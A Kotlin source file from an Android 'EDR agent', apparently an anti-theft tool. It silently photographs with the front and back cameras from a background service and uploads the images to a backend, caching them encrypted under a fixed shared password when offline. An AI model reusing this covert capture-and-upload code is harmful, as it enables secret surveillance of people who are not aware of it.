package com.edr.agent.camera

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import com.edr.agent.crypto.EdrFileLocker
import com.edr.agent.network.EdrHttpClient
import com.edr.agent.network.EdrNetworkManager
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Autonomous Background Camera Capturer (Zero-Activity / Non-Blocking).
 *
 * Captures photos directly from Front and Back cameras via Camera2 API from
 * the background service with 3A auto-exposure calibration so photos are clear
 * (never pure black or white).
 */
object SilentCameraCapturer {
    private const val TAG = "SilentCameraCapturer"
    private val isBusy = AtomicBoolean(false)

    private val httpClient = EdrHttpClient.apiClient

    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    fun capture(context: Context, triggerReason: String = "Manual Admin Request") {
        if (!isBusy.compareAndSet(false, true)) {
            Log.w(TAG, "Camera capture is already in progress. Ignoring duplicate request.")
            return
        }

        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "edr:camera_capture")

        Thread {
            try {
                wakeLock?.acquire(15000L) // 15s max timeout
                performCapture(context, triggerReason)
            } catch (e: Exception) {
                Log.e(TAG, "Unhandled error during silent camera capture: ${e.message}", e)
            } finally {
                isBusy.set(false)
                try {
                    if (wakeLock?.isHeld == true) wakeLock.release()
                } catch (ignored: Exception) {}
            }
        }.start()
    }

    private fun performCapture(context: Context, triggerReason: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "CAMERA permission not granted. Cannot capture intruder photo.")
            EdrLocalStorage.appendEdrLog(context, "CAMERA_ERR", "Capture aborted: CAMERA permission missing")
            return
        }

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        if (cameraManager == null) {
            Log.e(TAG, "CameraManager service unavailable.")
            return
        }

        var frontCameraId: String? = null
        var backCameraId: String? = null

        try {
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT && frontCameraId == null) {
                    frontCameraId = id
                } else if (facing == CameraCharacteristics.LENS_FACING_BACK && backCameraId == null) {
                    backCameraId = id
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error enumerating camera IDs: ${e.message}")
        }

        Log.i(TAG, "Capturing silent cameras. Front: $frontCameraId, Back: $backCameraId")

        val handlerThread = HandlerThread("EDR_CameraWorker").apply { start() }
        val handler = Handler(handlerThread.looper)

        var frontPhotoBytes: ByteArray? = null
        var backPhotoBytes: ByteArray? = null

        // 1. Capture Front Camera (Intruder Face)
        if (frontCameraId != null) {
            frontPhotoBytes = snapSingleCamera(cameraManager, frontCameraId, handler)
            Log.i(TAG, "Front camera capture complete: ${frontPhotoBytes?.size ?: 0} bytes")
        }

        // Brief cooldown between hardware camera switches
        try { Thread.sleep(250) } catch (ignored: Exception) {}

        // 2. Capture Back Camera (Environment / Room)
        if (backCameraId != null) {
            backPhotoBytes = snapSingleCamera(cameraManager, backCameraId, handler)
            Log.i(TAG, "Back camera capture complete: ${backPhotoBytes?.size ?: 0} bytes")
        }

        // Stop worker thread
        handlerThread.quitSafely()

        if (frontPhotoBytes == null && backPhotoBytes == null) {
            Log.w(TAG, "No photo bytes captured from either camera.")
            return
        }

        // Check Network Policy: Camera photos upload on ALL networks (4G, 5G, Wi-Fi, Hotspot).
        // Only if device is completely offline (NO_INTERNET), secure photos locally in /EDR/photos/
        val netStatus = EdrNetworkManager.getNetworkStatus(context)
        if (netStatus.type == EdrNetworkManager.ConnectionType.NO_INTERNET) {
            Log.i(TAG, "Device is offline. Locking photos to /EDR/photos/ with encryption...")
            savePhotosLockedLocally(context, triggerReason, frontPhotoBytes, backPhotoBytes)
            return
        }

        // 3. Upload evidence directly from memory to EDR Backend (NEVER saved unencrypted on phone storage or Gallery)
        var uploadedOk = false
        try {
            val deviceId = SyncPreferences.deviceId
            val payload = mutableMapOf<String, Any>(
                "deviceId" to deviceId,
                "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                "triggerReason" to triggerReason,
                "photoType" to "CAMERA_PHOTO"
            )

            if (frontPhotoBytes != null) {
                payload["frontPhotoBase64"] = Base64.encodeToString(frontPhotoBytes, Base64.NO_WRAP)
            }
            if (backPhotoBytes != null) {
                payload["backPhotoBase64"] = Base64.encodeToString(backPhotoBytes, Base64.NO_WRAP)
            }

            val uploadUrl = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/photos"
            Log.i(TAG, "Uploading intruder photo evidence over ${netStatus.label} to $uploadUrl...")

            val request = Request.Builder()
                .url(uploadUrl)
                .post(gson.toJson(payload).toRequestBody(jsonMediaType))
                .build()

            val response = httpClient.newCall(request).execute()
            uploadedOk = response.isSuccessful
            val code = response.code
            response.close()

            if (uploadedOk) {
                Log.i(TAG, "Intruder photos uploaded successfully! HTTP $code")
                EdrLocalStorage.appendEdrLog(
                    context,
                    "EVIDENCE",
                    "Captured & uploaded intruder photos ($triggerReason). Front: ${frontPhotoBytes != null}, Back: ${backPhotoBytes != null}"
                )
            } else {
                Log.e(TAG, "Server rejected intruder photo upload: HTTP $code")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed uploading intruder photo: ${e.message}", e)
        } finally {
            if (!uploadedOk) {
                Log.w(TAG, "Upload failed or interrupted. Securing photos into /EDR/photos/ locked with password protection...")
                savePhotosLockedLocally(context, triggerReason, frontPhotoBytes, backPhotoBytes)
            }
        }
    }

    private fun savePhotosLockedLocally(
        context: Context,
        triggerReason: String,
        front: ByteArray?,
        back: ByteArray?
    ) {
        try {
            val photosDir = EdrLocalStorage.getPhotosDir(context)
            val ts = System.currentTimeMillis()
            val cleanReason = triggerReason.replace("[^a-zA-Z0-9]".toRegex(), "_")

            if (front != null) {
                val frontFile = File(photosDir, "snap_${cleanReason}__${ts}_front.jpg")
                EdrFileLocker.lockBytes(front, frontFile, EdrFileLocker.PASSWORD_EDR)
            }
            if (back != null) {
                val backFile = File(photosDir, "snap_${cleanReason}__${ts}_back.jpg")
                EdrFileLocker.lockBytes(back, backFile, EdrFileLocker.PASSWORD_EDR)
            }
            Log.i(TAG, "Photos saved as encrypted .locked files in /EDR/photos/ with password protection.")
            EdrLocalStorage.appendEdrLog(
                context,
                "DATA_SAVER",
                "Photos saved as encrypted .locked in /EDR/photos/ (Network: ${EdrNetworkManager.getConnectionTypeLabel(context)})"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed locking photos locally: ${e.message}")
        }
    }

    /**
     * Flushes any offline locked photos when internet (4G, 5G, Wi-Fi, Hotspot) becomes available.
     */
    fun flushPendingLockedPhotos(context: Context) {
        Thread {
            try {
                val netStatus = EdrNetworkManager.getNetworkStatus(context)
                if (netStatus.type == EdrNetworkManager.ConnectionType.NO_INTERNET) {
                    return@Thread
                }
                val photosDir = EdrLocalStorage.getPhotosDir(context)
                val lockedFiles = photosDir.listFiles { _, name -> name.endsWith(EdrFileLocker.LOCKED_EXTENSION) }
                if (lockedFiles.isNullOrEmpty()) return@Thread

                val deviceId = SyncPreferences.deviceId
                val baseUrl = SyncPreferences.httpBaseUrl
                if (deviceId.isEmpty() || baseUrl.isEmpty()) return@Thread

                Log.i(TAG, "Found ${lockedFiles.size} offline locked photo(s). Retrying upload over ${EdrNetworkManager.getConnectionTypeLabel(context)}...")

                for (locked in lockedFiles) {
                    val bytes = EdrFileLocker.unlockToBytes(locked, EdrFileLocker.PASSWORD_EDR)
                    if (bytes == null || bytes.isEmpty()) {
                        continue
                    }
                    val isBack = locked.name.contains("_back.")
                    val isFront = !isBack
                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    val payload = mutableMapOf<String, Any>(
                        "deviceId" to deviceId,
                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                        "triggerReason" to "Offline Flushed Photo (${locked.name.removeSuffix(EdrFileLocker.LOCKED_EXTENSION)})",
                        "photoType" to "CAMERA_PHOTO"
                    )
                    if (isFront) payload["frontPhotoBase64"] = base64
                    if (isBack) payload["backPhotoBase64"] = base64

                    val request = Request.Builder()
                        .url("$baseUrl/api/devices/$deviceId/photos")
                        .post(gson.toJson(payload).toRequestBody(jsonMediaType))
                        .build()

                    val response = httpClient.newCall(request).execute()
                    val ok = response.isSuccessful
                    response.close()
                    if (ok) {
                        Log.i(TAG, "Successfully flushed photo ${locked.name} to cloud. Deleting locked file.")
                        locked.delete()
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error flushing offline photos: ${e.message}")
            }
        }.start()
    }

    @SuppressLint("MissingPermission")
    private fun snapSingleCamera(
        cameraManager: CameraManager,
        cameraId: String,
        handler: Handler
    ): ByteArray? {
        val latch = CountDownLatch(1)
        var capturedBytes: ByteArray? = null
        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null
        var imageReader: ImageReader? = null

        try {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
            val targetSize = sizes?.filter { it.width in 800..1920 }?.maxByOrNull { it.width * it.height }
                ?: sizes?.firstOrNull()

            val width = targetSize?.width ?: 1280
            val height = targetSize?.height ?: 720
            val orientation = getCameraOrientation(characteristics)

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        capturedBytes = bytes
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error acquiring image buffer: ${e.message}")
                } finally {
                    latch.countDown()
                }
            }, handler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface

                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                            set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                            set(CaptureRequest.JPEG_ORIENTATION, orientation)
                        }

                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(
                            listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    try {
                                        // Warm up auto-exposure (AE) and auto-white-balance (AWB)
                                        // so photo is not pure black (underexposed) or white (blown out)
                                        val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                            addTarget(surface)
                                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                            set(CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER, CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER_START)
                                        }

                                        session.capture(previewBuilder.build(), null, handler)

                                        // Allow 450ms for the camera sensor gain & exposure to stabilize
                                        handler.postDelayed({
                                            try {
                                                session.capture(captureBuilder.build(), null, handler)
                                            } catch (e: Exception) {
                                                Log.e(TAG, "Capture failed on camera $cameraId: ${e.message}")
                                                latch.countDown()
                                            }
                                        }, 450L)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Warmup trigger error on camera $cameraId: ${e.message}")
                                        try {
                                            session.capture(captureBuilder.build(), null, handler)
                                        } catch (e2: Exception) {
                                            latch.countDown()
                                        }
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    Log.e(TAG, "CaptureSession configure failed on camera $cameraId")
                                    latch.countDown()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Error creating capture session: ${e.message}")
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera $cameraId error: $error")
                    latch.countDown()
                }
            }, handler)

            // Wait up to 6 seconds per camera
            latch.await(6000, TimeUnit.MILLISECONDS)
        } catch (e: Exception) {
            Log.e(TAG, "Exception snapping camera $cameraId: ${e.message}")
        } finally {
            try {
                captureSession?.close()
            } catch (ignored: Exception) {}
            try {
                cameraDevice?.close()
            } catch (ignored: Exception) {}
            try {
                imageReader?.close()
            } catch (ignored: Exception) {}
        }

        return capturedBytes
    }

    private fun getCameraOrientation(characteristics: CameraCharacteristics): Int {
        val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
        val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
        return if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
            (sensorOrientation + 360) % 360
        } else {
            sensorOrientation
        }
    }
}
